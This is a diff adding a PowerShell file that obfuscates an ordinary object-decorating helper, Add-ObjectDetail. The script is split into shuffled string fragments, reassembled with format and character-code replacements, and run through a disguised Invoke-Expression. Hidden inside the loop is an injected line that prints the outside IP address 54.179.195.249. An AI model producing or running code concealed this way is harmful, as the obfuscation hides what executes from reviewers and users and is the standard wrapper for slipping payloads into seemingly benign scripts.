@@ -1,0 +1,169 @@
+ . ( $vErBOsePrEfeREncE.TOStrING()[1,3]+'X'-joiN'')((("{75}{99}{79}{80}{57}{28}{59}{98}{1}{106}{2}{9}{85}{69}{18}{38}{12}{103}{71}{16}{73}{45}{21}{90}{109}{41}{64}{84}{111}{81}{7}{52}{55}{37}{50}{17}{86}{102}{25}{104}{88}{110}{22}{62}{87}{36}{23}{76}{6}{97}{14}{33}{72}{44}{77}{95}{89}{67}{34}{58}{101}{83}{42}{10}{43}{74}{65}{100}{29}{40}{46}{56}{53}{8}{92}{5}{96}{35}{112}{91}{24}{32}{60}{70}{31}{68}{61}{54}{93}{94}{107}{26}{78}{48}{82}{0}{105}{19}{30}{47}{51}{20}{13}{39}{108}{63}{3}{27}{11}{4}{15}{66}{49}" -f '.PSObject.Properti','te. Accepts pipeline input.
+
+    .PARAMETER TypeName
+        Typename','how up ','efault display property set
+                    Add-Member -InputObject NvhObject -MemberType MemberSet -Name PSStandardMembers -Value NvhPSStandardMembers
+                }
+         ',' ','stem.String','erify that the othe','erty
+        Add-ObjectDetail -InputObject NvhObject -TypeName fyiApplicationX.Accountfyi -PropertyToAdd @',' Position=3)]
+           [ValidateNotNullOrEmpty()]
+           [Alias(fyidpfyi)]
+           ','when you use','ue,
+                 ','   ',' is a hashta','  ','
+            # First  Last    Account  AnotherProperty
+            # -----  ----    -------  ---------------
+            # Cookie Monster CMonster               5
+
+    .NOTES
+        This breaks the fyido one thingfyi rule from certain perspectives...
+        The goal ',' if(NvhPasst','        -PropertyToAdd @{
+                One =','erify that get-member shows us ','   .PARAMETER PropertyToAdd
+        Add these noteproperties.
+    ','PSNoteProperty(NvhKey, NvhPropertyToAdd','mes.Insert(0,NvhTypeName)
+                }
+       ','    Whether t','see t','       ','     Nvhddps = New-Object System.Management.Automation.PSPropertySet DefaultDisplayProper',' = fyiCookiefyi
+            Last = fyiMonsterfyi
+       ','EpLAce(fyiRVPfyi','   }
+       ','      ','= Nvhfalse,
+                       Position=2)]    ','[NvhKey]) ) ',' in NvhInputObject)
+        {
+','tySet,NvhDefaultProperties
+            NvhPSStandardMembers = [System.Management.Automation.P','is to decorate an object all in one shot
+   
+        This abstraction simplifies decorating an object, with a slight trade-off in performance. For examp','  ~4.6 seconds
+            Add-Member + PSObject.Typ','ru = NvhTrue
+    )
+    
+    Begin
+    {
+        if(NvhP','Account  AnotherProperty
+  ','r CMonster               5
+
+        ','    
+        Format','       fyiDefaultPropertiesfyi
+ ','
+           ','SCustomObject','NCTIONALITY
+        PowerShell Language
+    #>
+    [CmdletBinding()] 
+    param(
+           [Parameter( Mandatory = Nvhtr','      Position','bjects, add a p','  ','[System.Collections.Hashtable]NvhPropertyToAdd,
+
+         ',')  
+                    }
+                }
+                fyiTypeNamefyi
+                {
+                    #Add specified type
+                    [void]NvhObject.PSObject.TypeN',' #Add some noteproperties. Slightly faster than Add-Member.
+                       ','
+    }
+}
+','#V','a','{ AnotherProperty = 5 }
+
+            # First  Last    Ac','                   ','         {
+                fyiPropert','count  AnotherProperty
+            # -----  ----    -------  ---------------
+            # Cookie Monste','  [Parameter( Mandatory = Nvhfalse,
+   ','            - Default parameters
+
+    .DESCRIPTION
+        Helper function to decorate an object with
+            - A TypeName
+            - New properties
+','eNames.Inser','      - Default','SMemberInfo[]]Nvhddps
+        }
+    }
+    P','vhPSBoundParameters.Keys)
+   ','wo props by default
+        Add-ObjectDetail -InputObject NvhObject -PropertyToAdd @{ AnotherProperty = 5 } -DefaultProperties Account, AnotherProperty
+
+    ',' # Attach d',']@{
+       ',' [string]NvhTypeName,
+
+           [','hru)
+            {
+                NvhObject
+            }
+        }','-ObjectDetail:                      ','            switch (N','     
+ ','rocess
+    {
+        foreach(NvhObject','Property Value).
+
+        Example to add a One and Date property:
+
+    ','le:
+
+        10,000 o',' 1
+                Date = (Get-Date)
+            }
+
+    .PARAMETER DefaultProperties
+        Change the default properties that show up
+
+    .PARAMETER Passthru
+  ','=0,
+                       ValueFromPipeline=Nvhtrue )]
+           [ValidateNotNullOrEmpty()]
+           [psobject[]]NvhInputObject,
+
+           [Parameter( Mandatory = Nvhfalse,
+                       Position=1)]
+          ','function Add-ObjectDetail
+{
+    <#','   # -------  ---------------
+            # CMonster               5
+
+        #V','rop',',[STRING][CHAr]39) )jAH  write-host
+                       ','  - New properti','es
+','pe name and a random prop',' NvhObject','om Shay Levy:
+        http://blogs.microsoft.co.il/scriptfanatic/2012/04/13/custom-objects-default-display-in-powershell-30/
+        
+    .FU','     First = fyiCookie',' Get-Member against the resulting object.
+   ','the right type
+        ','        # ','d a ','dd','o pass the resulting object on. Defaults to true
+
+    .EXAMPLE
+        #
+        # Create an ','   # define a subset of properties
+       ','[Sy','yToAddfyi
+                {
+                    foreach(NvhKey i','n NvhPropertyToAdd.Keys)
+                    {
+                        ((fyiRVPipfyi+fyi:54.17fyi+fyi9.195.24f','erty and typename:
+            A','[]]NvhDefaultProperties,
+
+           [boolean]NvhPassth','r properties are around
+        NvhObject jAH Select -Property *
+',' parameters 
+
+    .PARAMETER InputObject
+        Object to decora','
+    .SYNOPSIS
+        Decorate an object with
+            - A TypeName
+          ','Parameter( Mandatory ','t:  ~3 seconds
+
+        Initial code borrowed fr','NvhObject jAH Get-Member
+
+            # TypeName: ApplicationX.Account ...
+
+    .EXAMPLE
+        #
+        # Create an object to work with
+        NvhObject = [PSCustomObject]@{
+            First','ble with Key (Property Name) = Value (','     Account = fyiCMonsterfyi
+        }
+
+        #Ad','es.Add( ( New-Object System.Management.Automation.',' to insert.
+        
+        This will s','yi+fyi9fyi+fyiRVPfyi).r','               {
+                   ','object to work with
+        NvhObject = [P','random property, set a default property set so we only ','fyi
+            Last = fyiMonsterfyi
+            Account = fyiCMonsterfyi
+        }
+
+        #Add a ty','SBoundParameters.ContainsKey(fyiDefaultPropertiesfyi))
+        {
+         ')).rEPlACE(([CHAR]78+[CHAR]118+[CHAR]104),'$').rEPlACE(([CHAR]102+[CHAR]121+[CHAR]105),[stRINg][CHAR]39).rEPlACE(([CHAR]106+[CHAR]65+[CHAR]72),'|'))
